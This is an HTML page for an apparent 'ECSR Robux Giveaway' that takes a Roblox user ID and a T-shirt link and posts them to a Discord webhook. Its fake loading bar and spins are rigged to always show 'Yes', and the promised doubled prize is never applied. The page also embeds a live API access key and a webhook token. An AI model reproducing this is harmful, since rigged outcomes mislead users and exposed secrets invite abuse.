<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ECSR Robux Giveaway</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #0f0f0f;
            color: #0ff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background: #111;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 0 25px #0ff;
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        h1, h2, p {
            color: #0ff;
            text-shadow: 0 0 5px #0ff;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            margin: 15px 0;
            border: none;
            border-radius: 8px;
            background: #222;
            color: #0ff;
            box-shadow: 0 0 10px #0ff inset;
        }
        button {
            background-color: #0ff;
            color: black;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0 0 10px #0ff;
            transition: 0.3s;
        }
        button:hover {
            box-shadow: 0 0 20px #0ff;
        }
        .hidden { display: none; }
        #loadingBar {
            width: 100%;
            background: #222;
            border-radius: 8px;
            overflow: hidden;
            margin: 20px 0;
        }
        #loadingProgress {
            width: 0%;
            height: 16px;
            background: #0ff;
            transition: width 0.2s ease;
        }
        #profile-image {
            margin-top: 20px;
            border-radius: 4px;
            max-width: 100%;
            height: auto;
            box-shadow: 0 0 10px #0ff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ECSR Robux Giveaway</h1>
        <input type="text" id="robloxUserId" placeholder="Enter your Roblox ECSR ID">
        <button id="startButton">Start</button>

        <div id="loadingStep" class="hidden">
            <h2>Loading your profile...</h2>
            <div id="loadingBar"><div id="loadingProgress"></div></div>
        </div>

        <div id="verificationStep" class="hidden">
            <h2>Is this you?</h2>
            <img id="profile-image" src="" alt="Roblox Profile Image">
            <button id="confirmButton">Yes</button>
        </div>

        <div id="willGetRobuxStep" class="hidden">
            <h2>Will you get Robux?</h2>
            <p id="spinText"></p>
        </div>

        <div id="amountStep" class="hidden">
            <h2>You won <span id="robuxAmount"></span> Robux!</h2>
        </div>

        <div id="doublePrizeStep" class="hidden">
            <h2>Double Prize?</h2>
            <p id="doubleSpinText"></p>
        </div>

        <div id="tshirtLinkStep" class="hidden">
            <h2>Submit Your T-Shirt</h2>
            <input type="text" id="tshirtLink" placeholder="T-Shirt Link">
            <button id="submitTshirt">Submit</button>
        </div>

        <div id="finalStep" class="hidden">
            <h2>Thank You!</h2>
            <p>Your request was submitted.</p>
        </div>
    </div>

    <script>
        const startButton = document.getElementById('startButton');
        const userIdInput = document.getElementById('robloxUserId');
        const loadingStep = document.getElementById('loadingStep');
        const loadingProgress = document.getElementById('loadingProgress');
        const verificationStep = document.getElementById('verificationStep');
        const profileImage = document.getElementById('profile-image');
        const confirmButton = document.getElementById('confirmButton');
        const willGetRobuxStep = document.getElementById('willGetRobuxStep');
        const spinText = document.getElementById('spinText');
        const amountStep = document.getElementById('amountStep');
        const robuxAmountSpan = document.getElementById('robuxAmount');
        const doublePrizeStep = document.getElementById('doublePrizeStep');
        const doubleSpinText = document.getElementById('doubleSpinText');
        const tshirtLinkStep = document.getElementById('tshirtLinkStep');
        const tshirtLink = document.getElementById('tshirtLink');
        const submitTshirt = document.getElementById('submitTshirt');
        const finalStep = document.getElementById('finalStep');

        let finalRobux = 0;

        startButton.onclick = () => {
            const userId = userIdInput.value.trim();
            if (!userId) return alert('Enter ID');
            startButton.classList.add('hidden');
            userIdInput.classList.add('hidden');
            loadingStep.classList.remove('hidden');
            let duration = Math.floor(Math.random() * 3000) + 8000; // 8â€“11 sec
            let startTime = Date.now();
            let interval = setInterval(() => {
                let percent = ((Date.now() - startTime) / duration) * 100;
                loadingProgress.style.width = Math.min(percent, 100) + '%';
                if (percent >= 100) {
                    clearInterval(interval);
                    showVerification(userId);
                }
            }, 100);
        };

        async function showVerification(userId) {
            loadingStep.classList.add('hidden');
            try {
                const res = await fetch(`https://ecsr.io/apisite/thumbnails/v1/users/avatar-headshot?userIds=${userId}`);
                const json = await res.json();
                const imageUrl = json?.data?.[0]?.imageUrl;
                if (imageUrl && imageUrl !== '/images/thumbnails/blank.png') {
                    profileImage.src = 'https://ecsr.io' + imageUrl;
                } else {
                    profileImage.src = `https://api.apiflash.com/v1/urltoimage?access_key=91aeaa0c407e4f089e1c49af78437242&url=https%3A%2F%2Fecsr.io%2Fusers%2F${userId}%2Fprofile&format=png&delay=5&response_type=image`;
                }
            } catch {
                profileImage.src = `https://api.apiflash.com/v1/urltoimage?access_key=91aeaa0c407e4f089e1c49af78437242&url=https%3A%2F%2Fecsr.io%2Fusers%2F${userId}%2Fprofile&format=png&delay=5&response_type=image`;
            }
            verificationStep.classList.remove('hidden');
        }

        confirmButton.onclick = () => {
            verificationStep.classList.add('hidden');
            willGetRobuxStep.classList.remove('hidden');
            let count = 0;
            const spinInterval = setInterval(() => {
                spinText.textContent = count % 2 === 0 ? 'No' : 'Yes';
                count++;
                if (count > 10) {
                    clearInterval(spinInterval);
                    spinText.textContent = 'Yes';
                    setTimeout(showAmount, 1000);
                }
            }, 150);
        };

        function showAmount() {
            willGetRobuxStep.classList.add('hidden');
            amountStep.classList.remove('hidden');
            finalRobux = Math.floor(Math.random() * (100 - 10 + 1)) + 10;
            finalRobux = Math.floor(finalRobux / 2);
            robuxAmountSpan.textContent = finalRobux;
            setTimeout(showDoubleSpin, 2000);
        }

        function showDoubleSpin() {
            amountStep.classList.add('hidden');
            doublePrizeStep.classList.remove('hidden');
            let count = 0;
            const doubleInterval = setInterval(() => {
                doubleSpinText.textContent = count % 2 === 0 ? 'No' : 'Yes';
                count++;
                if (count > 10) {
                    clearInterval(doubleInterval);
                    doubleSpinText.textContent = 'Yes';
                    setTimeout(() => {
                        doublePrizeStep.classList.add('hidden');
                        tshirtLinkStep.classList.remove('hidden');
                    }, 1000);
                }
            }, 150);
        }

        submitTshirt.onclick = async () => {
            if (!tshirtLink.value.trim()) return alert('Enter T-Shirt link');
            tshirtLinkStep.classList.add('hidden');
            finalStep.classList.remove('hidden');
            await fetch('https://webhook.lewisakura.moe/api/webhooks/1375801999031009481/vd7Jp0aByQintEklFwy2tQurKJFdGPF9uIKczMqwTbEOV70avbjTXKdEpK2YViaiXD8r', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `ðŸŽ‰ Robux Giveaway ðŸŽ‰\nUser ID: ${userIdInput.value}\nWon Robux: ${finalRobux}\nT-Shirt Link: ${tshirtLink.value}`
                })
            });
        };
    </script>
</body>
</html>
